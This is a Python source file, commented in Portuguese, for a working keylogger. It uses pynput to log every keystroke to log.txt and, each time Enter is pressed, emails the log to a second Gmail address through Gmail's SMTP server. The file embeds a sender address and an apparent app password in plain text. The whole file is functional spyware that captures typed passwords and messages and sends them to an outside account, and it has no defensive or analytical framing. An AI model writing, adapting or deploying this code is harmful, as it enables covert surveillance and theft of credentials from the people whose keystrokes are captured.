from pynput.keyboard import Listener
import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Configurações do servidor de e-mail (Gmail)
smtp_host = 'smtp.gmail.com'  # Servidor correto para Gmail
smtp_port = 587
sender_email = "schlusselabholen@gmail.com"  # Seu e-mail
password = "irah lzes ryee zofw"  # Sua senha de aplicativo do Gmail

# Função para enviar o e-mail com o arquivo de log
def send_email(arquivo):
    receiver_email = "schlusselerhalten@gmail.com"  # E-mail destinatário
    assunto = 'Log de Teclas'
    corpo = "Arquivo log.txt contendo as teclas pressionadas."

    # Configuração da mensagem de e-mail
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = assunto

    msg.attach(MIMEText(corpo, 'plain'))

    # Anexar o arquivo de log
    attachment = MIMEBase('application', 'octet-stream')
    with open(arquivo, 'rb') as f:
        attachment.set_payload(f.read())
    encoders.encode_base64(attachment)
    attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(arquivo)}')
    msg.attach(attachment)

    # Enviar o e-mail
    try:
        with smtplib.SMTP(smtp_host, smtp_port) as servidor:
            servidor.starttls()  # Cria uma conexão segura
            servidor.login(sender_email, password)  # Faz login com seu e-mail e senha
            servidor.send_message(msg)
        print("E-mail enviado com sucesso!")
    except Exception as e:
        print(f"Erro ao enviar e-mail: {e}")

# Função para registrar as teclas e enviar o log por e-mail
def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    ignored_keys = ['Key.shift_r', 'Key.ctrl_l', 'Key.shift', 'Key.alt_l', 'Key.backspace', 'Key.tab']

    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.enter':
        letter = '\n'
        send_email("log.txt")  # Enviar o email ao pressionar Enter
    elif letter in ignored_keys:
        letter = ''  # Ignora as teclas definidas
    elif letter == 'Key.caps_lock':
        letter = '\nCAPS LOCK\n'

    with open("log.txt", 'a') as f:
        f.write(letter)

# Iniciar o listener do teclado
with Listener(on_press=write_to_file) as l:
    l.join()
